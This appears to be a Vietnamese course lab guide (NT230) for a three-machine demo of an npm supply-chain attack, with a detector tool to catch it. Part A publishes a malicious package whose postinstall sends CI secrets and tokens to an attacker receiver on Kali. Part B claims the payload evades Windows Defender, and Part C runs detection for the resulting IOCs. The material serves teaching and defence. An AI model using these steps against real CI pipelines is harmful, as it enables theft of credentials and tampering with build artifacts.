# NT230 — Hướng Dẫn Demo 3 Phần (A + B + C)

## Cấu hình 3 máy

| Máy | Hệ điều hành | Vai trò | IP ví dụ |
|-----|-------------|---------|----------|
| **Machine A** | Ubuntu | GitLab CE (tùy chọn) | `192.168.x.A` |
| **Machine B** | Windows VM | Victim / CI Pipeline | `192.168.x.B` |
| **Machine C** | Kali Linux | Attacker | `192.168.x.C` |

> **Machine A không bắt buộc** — bỏ qua nếu không cần demo với GitLab thật.

---

## Chuẩn bị (làm 1 lần trước khi demo)

### Machine C (Kali) — cài tools
```bash
# Cài Node.js >= 18 nếu chưa có
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
sudo apt install -y nodejs

# Mở firewall
sudo ufw allow 4873/tcp
sudo ufw allow 8080/tcp

# Clone/copy repo
git clone <repo_url> ~/CIPipeline
cd ~/CIPipeline
```

### Machine B (Windows VM) — kiểm tra kết nối
```powershell
# Đảm bảo network adapter là Bridged (không phải NAT)
# Kiểm tra ping đến Kali
Test-NetConnection -ComputerName 192.168.x.C -Port 4873
Test-NetConnection -ComputerName 192.168.x.C -Port 8080
```

### Machine A (Ubuntu) — chỉ cần nếu dùng GitLab
```bash
cd ~/CIPipeline
docker compose -f docker-compose.gitlab.yml up -d
# Đợi 3 phút → mở http://localhost:80
# Lấy password root: docker exec gitlab-host cat /etc/gitlab/initial_root_password
```

---

---

# PHẦN A — Supply Chain Attack

> **Mục tiêu**: Attacker publish package độc lên Verdaccio → Victim `npm install` →
> package tự exfiltrate CI secrets về Kali.

---

## Bước A1 — Machine C (Kali): Khởi động Attacker Services

Mở **Terminal 1** trên Kali:
```bash
cd ~/CIPipeline

# Khởi động Verdaccio (private registry)
verdaccio --config ./infra/verdaccio/config-native.yaml --listen 0.0.0.0:4873
```

Mở **Terminal 2** trên Kali:
```bash
cd ~/CIPipeline

# Khởi động receiver (C2 server)
node attacker-server/receiver.js
```

Mở **Terminal 3** trên Kali:
```bash
# Kiểm tra cả 2 services
curl http://localhost:4873       # thấy HTML Verdaccio = OK
curl http://localhost:8080/beacon  # thấy JSON = OK

# Lấy IP Kali
ip addr show | grep "inet 192"
# → ghi nhớ IP này: 192.168.x.C
```

---

## Bước A2 — Machine C (Kali): Publish Package Độc

Vẫn trên **Terminal 3**:

```bash
cd ~/CIPipeline

# Đăng ký user Verdaccio (chỉ làm 1 lần)
npx npm-cli-adduser \
  --username demo \
  --password demo \
  --email demo@demo.com \
  --registry http://localhost:4873

# Encode IP Kali vào config.json (stealth mode)
ATTACKER_IP=$(hostname -I | awk '{print $1}')
node -e "
const fs = require('fs');
const cfg = { host: '$ATTACKER_IP', port: 8080 };
fs.writeFileSync(
  'packages/safe-marker-package/scripts/config.json',
  JSON.stringify(cfg, null, 2)
);
console.log('Config updated:', cfg);
"

# Publish package độc
cd packages/safe-marker-package
npm publish --registry http://localhost:4873
```

✅ **Kiểm tra**: Mở browser Kali → `http://localhost:4873` → thấy `@demo/safe-marker-package`

---

## Bước A3 — Machine B (Windows): Chạy CI Pipeline

Mở PowerShell trên Windows:
```powershell
cd E:\NT\CIPipeline

# Xóa state cũ (nếu có)
Remove-Item -Recurse -Force consumer-app\node_modules -ErrorAction SilentlyContinue
Remove-Item -Force consumer-app\package-lock.json -ErrorAction SilentlyContinue

# Chạy CI pipeline — trỏ về Kali (thay 192.168.x.C bằng IP thật)
.\scripts\2-ci-pipeline-run.ps1 -VerdaccioHost 192.168.x.C
```

**Quan sát Terminal 2 (Kali — receiver.js)**:
```
═══════════════════════════════════════════════════════════
[...] ◄◄ CI SECRETS RECEIVED from ::ffff:192.168.x.B
──────────────────────────────────────────────────────────
  [secrets]
    AWS_SECRET_ACCESS_KEY=... ◄ HIGH VALUE
    CI_JOB_TOKEN=...          ◄ HIGH VALUE
    GITHUB_TOKEN=...          ◄ HIGH VALUE
    NPM_TOKEN=...             ◄ HIGH VALUE
═══════════════════════════════════════════════════════════
```

---

## Bước A4 — Machine C (Kali): Thu Thập Bằng Chứng

```bash
# Xem loot files
cat ~/CIPipeline/attacker-server/loot/secrets_*.json

# Xem tất cả loot
ls -la ~/CIPipeline/attacker-server/loot/
```

**Kết quả kỳ vọng**:
- `secrets_<timestamp>.json` — CI tokens, SSH keys, env vars của victim
- `poison_<timestamp>.json` — xác nhận artifact đã bị tamper

---

## (Tùy chọn) Bước A5 — Chạy với GitLab thật (Machine A)

Nếu đã setup GitLab CE trên Machine A:
```powershell
# Machine B — push code lên GitLab để trigger pipeline thật
cd E:\NT\CIPipeline
git remote add gitlab http://192.168.x.A/root/supply-chain-victim
git push gitlab main
# → Xem pipeline chạy tại http://192.168.x.A
```

---

---

# PHẦN B — Bypass Windows Defender

> **Mục tiêu**: Chứng minh Windows Defender không phát hiện JS payload —
> vì Node.js (V8) không tích hợp AMSI.

**Chạy trên Machine B (Windows)** — mở **PowerShell as Administrator**:

```powershell
cd E:\NT\CIPipeline
.\scripts\test-av-bypass.ps1
```

Script tự động làm:
1. Thu thập thông tin Defender (version, signature date)
2. Chạy Custom Scan toàn bộ project folder
3. Đợi scan hoàn tất (~30 giây)
4. Kiểm tra threat history
5. Ghi report ra `artifacts/av-bypass-report.txt`

**Kết quả kỳ vọng**:
```
[4/5] Checking Defender threat history...
  ✓ No threats detected — payload BYPASSED Defender
```

**Xem report**:
```powershell
Get-Content artifacts\av-bypass-report.txt
```

---

## (Tùy chọn) Multi-Engine scan với VirusTotal

```powershell
# Không cần Admin — tính SHA-256 hash để tra tay
.\scripts\test-multi-av.ps1

# Tự động query 60+ engines (cần API key miễn phí từ virustotal.com)
.\scripts\test-multi-av.ps1 -VTApiKey "your_api_key_here"
```

**Kết quả thực tế đã kiểm chứng**:
| File | VirusTotal | Defender |
|------|-----------|---------|
| `postinstall-ci-attack.js` (JS) | **0 / 61** | Không phát hiện |
| Python payload tương đương | 6 / 61 | Tự động quarantine |

---

---

# PHẦN C — Detector (Công cụ phát hiện)

> **Mục tiêu**: Demo các lớp IOC phát hiện tấn công chuỗi cung ứng.

**Chạy trên Machine B (Windows)**.

---

## Cách C1 — Monitor-Install (mạnh nhất — bắt live IOC-2)

Xóa node_modules trước, sau đó monitor trong khi cài lại:

```powershell
cd E:\NT\CIPipeline

# Xóa node_modules để cài lại từ đầu
Remove-Item -Recurse -Force consumer-app\node_modules -ErrorAction SilentlyContinue
Remove-Item -Force consumer-app\package-lock.json -ErrorAction SilentlyContinue

# Monitor live — poll network mỗi 500ms trong khi npm install chạy
node detector\detect-supply-chain.js monitor-install .\consumer-app http://192.168.x.C:4873
```

**Kết quả kỳ vọng**:
```
[IOC-2-LIVE] OUTBOUND: node.exe → 192.168.x.C:8080 (Established) [poll #3]
[IOC-1v2] STEALTH: @demo/safe-marker-package → loader.js: config-driven execution
[MONITOR-INSTALL] Detected 1 suspicious outbound connection(s) during install!
```

---

## Cách C2 — Full Scan (sau khi attack đã xảy ra)

```powershell
cd E:\NT\CIPipeline

# Lưu baseline artifact trước (nếu chưa có)
node detector\detect-supply-chain.js baseline artifacts

# Chạy toàn bộ 3 IOC cùng lúc
node detector\detect-supply-chain.js full . artifacts
```

**Kết quả kỳ vọng**:
```
[ALERT] [IOC-1] SUSPICIOUS: @demo/safe-marker-package → process.env, TOKEN, SECRET, http.request
[ALERT] [IOC-2] node.exe has outbound connection to 192.168.x.C:8080 (ESTABLISHED)
[ALERT] [IOC-3] TAMPERED: "build-output.txt" hash changed!

[RESULT] 3 ALERT(s) detected! Review: detector\detector-alerts.log
```

---

## Cách C3 — Safe Install (phòng ngừa — chặn trước khi chạy)

```powershell
# Cài package nhưng KHÔNG chạy postinstall → scan trước → quyết định có rebuild không
node detector\detect-supply-chain.js safe-install .\consumer-app
```

---

## Cách C4 — Continuous Watch

```powershell
# Theo dõi liên tục mỗi 5 giây
node detector\detect-supply-chain.js watch artifacts
```

---

## Tổng hợp các IOC

| IOC | Phát hiện | Lệnh |
|-----|----------|------|
| **IOC-1 v1** | Suspicious keywords trong postinstall | `scan <node_modules>` |
| **IOC-1 v2** | Multi-stage loader (stealth) | Tự động kèm theo `scan` |
| **IOC-1 v3** | Entropy + deobfuscation | Tự động kèm theo `scan` |
| **IOC-2** | Outbound connection của node.exe | `network` |
| **IOC-2 LIVE** | Connection trong khi npm install | `monitor-install` |
| **IOC-3** | Artifact SHA-256 tampered | `verify <artifacts>` |

---

---

# Thứ Tự Demo Hoàn Chỉnh (A → B → C)

```
[Machine C] Mở Terminal 1:  verdaccio --config ./infra/verdaccio/config-native.yaml --listen 0.0.0.0:4873
[Machine C] Mở Terminal 2:  node attacker-server/receiver.js
[Machine C] Terminal 3:     publish package (Bước A2)

[Machine B] PowerShell 1:   .\scripts\2-ci-pipeline-run.ps1 -VerdaccioHost 192.168.x.C
            → Quan sát Terminal 2 (Kali) thấy secrets đến

[Machine C] Terminal 3:     cat ~/CIPipeline/attacker-server/loot/secrets_*.json

[Machine B] PowerShell 2:   .\scripts\test-av-bypass.ps1          [Run as Admin]
            → "No threats detected — payload BYPASSED Defender"

[Machine B] PowerShell 1:   node detector\detect-supply-chain.js monitor-install .\consumer-app http://192.168.x.C:4873
            → Thấy IOC-2-LIVE + IOC-1v2 alerts
```

---

# Cleanup Sau Demo

**Machine B (Windows)**:
```powershell
cd E:\NT\CIPipeline

# Xóa node_modules
Remove-Item -Recurse -Force consumer-app\node_modules -ErrorAction SilentlyContinue
Remove-Item -Force consumer-app\package-lock.json -ErrorAction SilentlyContinue

# Xóa detector logs
Remove-Item detector\detector-alerts.log -ErrorAction SilentlyContinue
Remove-Item detector\artifact-hashes.json -ErrorAction SilentlyContinue
```

**Machine C (Kali)**:
```bash
# Xóa loot
rm -rf ~/CIPipeline/attacker-server/loot/*

# Dừng Verdaccio + receiver (Ctrl+C trên từng terminal)
# Hoặc kill toàn bộ node processes
pkill -f "verdaccio"
pkill -f "receiver.js"
```
